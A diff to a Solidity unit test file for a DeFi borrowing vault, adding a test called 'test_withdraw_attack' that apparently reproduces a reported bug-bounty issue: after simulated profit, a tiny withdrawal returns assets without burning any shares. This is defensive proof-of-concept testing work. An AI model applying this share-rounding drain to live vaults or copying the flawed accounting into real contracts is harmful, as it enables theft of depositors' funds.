@@ -11,6 +11,8 @@ import {ILendingProvider} from "../../../src/interfaces/ILendingProvider.sol";
 import {BorrowingVault} from "../../../src/vaults/borrowing/BorrowingVault.sol";
 import {BaseVault} from "../../../src/abstracts/BaseVault.sol";
 
+import {MockERC20} from "../../../src/mocks/MockERC20.sol";
+
 contract VaultUnitTests is MockingSetup, MockRoutines {
   event MinAmountChanged(uint256 newMinAmount);
   event DepositCapChanged(uint256 newDepositCap);
@@ -470,5 +472,32 @@ contract VaultUnitTests is MockingSetup, MockRoutines {
   function test_liquidateInvalidInput() public {
     vm.expectRevert(BorrowingVault.BorrowingVault__liquidate_invalidInput.selector);
     vault.liquidate(ALICE, address(0));
+  }
+
+  // hat finance issue 
+  function test_withdraw_attack() public {
+    /// ALICE deposit 1000000 asset into vault 
+    uint256 amount = vault.minAmount();
+    do_deposit(amount, vault, ALICE);
+
+    /// MOCK: provider make profit and the new vault.totalAsset = 4000000
+    dealMockERC20(vault.asset(), address(vault), 3 * amount);
+    MockERC20 asset = MockERC20(vault.asset());
+    asset.makeDeposit(address(vault), 3 * amount, "Mock_V1");
+
+    uint oldShare = vault.balanceOf(ALICE);
+    uint oldBalance = IERC20(vault.asset()).balanceOf(ALICE);
+
+    /// ALICE withdraw 1 asset tokens 
+    do_withdraw(1, vault, ALICE);
+
+    uint newShare = vault.balanceOf(ALICE);
+    uint newBalance = IERC20(vault.asset()).balanceOf(ALICE);
+
+    /// Alice 's share doesn't change after the withdraw 
+    assertEq(oldShare, newShare);
+
+    /// Alice 's balance increase by 1 after the withdraw
+    assertEq(oldBalance + 1, newBalance);
   }
 }
